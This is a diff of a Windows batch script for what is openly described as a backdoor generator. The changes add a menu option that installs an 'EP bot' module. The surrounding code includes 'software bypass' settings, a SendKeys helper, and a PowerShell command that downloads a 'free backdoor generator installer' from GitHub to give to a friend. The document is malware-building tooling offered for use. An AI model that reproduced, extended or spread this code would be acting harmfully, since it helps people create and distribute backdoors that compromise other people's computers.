@@ -11,7 +11,7 @@ ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
 ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
 ECHO WshShell.SendKeys "{F11}"                            >>"%TempVBSFile%
 ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
-set temp=0&set autofullscreen=true&set updatelogs=true&set debug_enabled=false&set antivirus=true&set progress_bar=true&set payload_is_exist=0&set cmd_is_exist=0&set control_is_exist=0&color 0F&set reg_value_exists=0&set target_software_bypass=false
+set temp=0&set autofullscreen=true&set updatelogs=true&set debug_enabled=false&set antivirus=true&set progress_bar=true&set payload_is_exist=0&set cmd_is_exist=0&set control_is_exist=0&color 0F&set reg_value_exists=0&set target_software_bypass=false&set EP_install_launched_from_menu=false
 if not exist C:\ProgramData\autofullscreen.sav echo true>C:\ProgramData\autofullscreen.sav
 if not exist C:\ProgramData\updatelogs.sav echo true>C:\ProgramData\updatelogs.sav
 if not exist C:\ProgramData\debug_enabled.sav echo false>C:\ProgramData\debug_enabled.sav
@@ -336,9 +336,10 @@ goto start
 echo.
 echo Hello %username%, you have been granted access to the EP bot module.
 echo if you do not want to install it you will recieve this option next time you launch
-echo please note that this module is untested and may crash
+echo please note that this module is untested and may crash (no damage to your device will be cause if there is an error)
 choice /M "would you like to install it now?"
 if %errorlevel% equ 2 goto EPbot_installed
+:menu_install
 echo.
 echo this module is extremely complicated so a text file will be put in the install directory containing instructions on how to use it
 echo.
@@ -374,6 +375,8 @@ echo [31mWARNING! [33ma window will have opened to build the textract font dat
 echo.
 echo press any key to return to the menu...
 pause >nul
+if %EP_install_launched_from_menu% equ true (set EP_install_launched_from_menu=false
+goto menu)
 goto EP_finish
 :menu
 cls
@@ -389,9 +392,10 @@ echo 4(built in antivirus (prevents you from backdooring your own PC) (%antiviru
 echo 5(run progress_bar while generating (%progress_bar%) 
 echo 6(legacy mode, old software bypass mode (broken) (%target_software_bypass%)
 echo 7(download free installer (downloads an installer for the free version of the backdoor generator to give to a friend.)
-echo 8(back to main menu
+echo 8(download EP bot
+echo 9(back to main menu
 echo.
-choice /M "option: " /c 12345678 /n
+choice /M "option: " /c 123456789 /n
 if %errorlevel% equ 1 goto menu1
 if %errorlevel% equ 2 goto menu2
 if %errorlevel% equ 3 goto menu3
@@ -399,7 +403,8 @@ if %errorlevel% equ 4 goto menu4
 if %errorlevel% equ 5 goto menu5
 if %errorlevel% equ 6 goto menu6
 if %errorlevel% equ 7 goto menu7
-if %errorlevel% equ 8 goto exit_menu
+if %errorlevel% equ 8 goto menu8
+if %errorlevel% equ 9 goto exit_menu
 :menunxt
 echo %autofullscreen%>C:\ProgramData\autofullscreen.sav
 echo %updatelogs%>C:\ProgramData\updatelogs.sav
@@ -442,3 +447,6 @@ goto menunxt
 set /p free_dir_install=download location:
 Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/free_installer.bat").Content >"%free_dir_install%\free backdoor generator installer.bat"
 goto menunxt
+:menu8
+set EP_install_launched_from_menu=true
+goto menu_install
